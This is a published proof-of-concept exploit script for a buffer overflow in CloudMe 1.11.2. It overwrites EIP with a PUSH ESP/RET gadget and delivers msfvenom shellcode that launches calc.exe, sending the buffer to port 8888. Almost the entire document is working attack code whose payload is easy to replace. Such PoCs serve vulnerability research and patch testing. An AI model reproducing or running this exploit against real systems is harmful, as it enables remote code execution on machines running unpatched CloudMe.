# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xd9\xca\xba\x3f\x4c\x45\x98\xd9\x74\x24\xf4\x5e"
payload += b"\x29\xc9\xb1\x3e\x31\x56\x19\x03\x56\x19\x83\xee"
payload += b"\xfc\xdd\xb9\xb9\x70\xa3\x42\x42\x81\xc3\xcb\xa7"
payload += b"\xb0\xc3\xa8\xac\xe3\xf3\xbb\xe1\x0f\x78\xe9\x11"
payload += b"\x9b\x0c\x26\x15\x2c\xba\x10\x18\xad\x96\x61\x3b"
payload += b"\x2d\xe4\xb5\x9b\x0c\x27\xc8\xda\x49\x55\x21\x8e"
payload += b"\x02\x12\x94\x3f\x26\x6e\x25\xcb\x74\x7f\x2d\x28"
payload += b"\xcc\x7e\x1c\xff\x46\xd9\xbe\x01\x8a\x52\xf7\x19"
payload += b"\xcf\x5e\x41\x91\x3b\x15\x50\x73\x72\xd6\xff\xba"
payload += b"\xba\x25\x01\xfa\x7d\xd5\x74\xf2\x7d\x68\x8f\xc1"
payload += b"\xfc\xb6\x1a\xd2\xa7\x3d\xbc\x3e\x59\x92\x5b\xb4"
payload += b"\x55\x5f\x2f\x92\x79\x5e\xfc\xa8\x86\xeb\x03\x7f"
payload += b"\x0f\xaf\x27\x5b\x4b\x74\x49\xfa\x31\xdb\x76\x1c"
payload += b"\x9a\x84\xd2\x56\x37\xd1\x6e\x35\x52\x24\xfc\x43"
payload += b"\x10\x26\xfe\x4b\x05\x4e\xcf\xc0\xca\x09\xd0\x02"
payload += b"\xaf\xe5\x9a\x0f\x86\x6d\x43\xda\x9a\xf0\x74\x30"
payload += b"\xd8\x0c\xf7\xb1\xa1\xeb\xe7\xb3\xa4\xb0\xaf\x28"
payload += b"\xd5\xa9\x45\x4f\x4a\xca\x4f\x0c\x56\x68\x08\xf2"
payload += b"\xcb\xe0\x98\xa8\x7b\x74\x3d\x3e\x1f\x07\xe1\xa7"
payload += b"\xa6\x8a\x45\x5d\x29\x38\x19\xfc\xad\x9c\x8b\x9d"
payload += b"\x03\x79\x2c\x07\x7c\xb0\xfc\xe9\x4d\x82\xd2\xc4"
payload += b"\x98\xcc\x1e\x11\xc3\x24\x6b\x69\x36\x64\xbe\xf4"
payload += b"\x18\x07\xad\x92\x76\xa2\x55\x3e\x87"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
